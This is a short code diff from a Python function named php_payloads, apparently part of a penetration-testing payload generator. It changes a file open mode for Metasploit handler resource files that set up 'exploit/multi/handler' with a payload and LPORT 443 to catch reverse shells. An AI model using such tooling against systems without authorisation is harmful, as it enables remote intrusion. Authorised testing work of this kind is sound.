@@ -148,7 +148,7 @@ def php_payloads(ip, output_dir, payload_port):
 		# strip off ext and replace with .rc
 
 		handler = ext.split(".")[0] + ".rc"
-		handler_file = open(base + "handlers/" + handler , "w")
+		handler_file = open(base + "handlers/" + handler , "w+")
 		handler_file.write("use exploit/multi/handler\n")
 		handler_file.write("set payload " + payload +"\n")
 		handler_file.write("set LPORT 443\n")
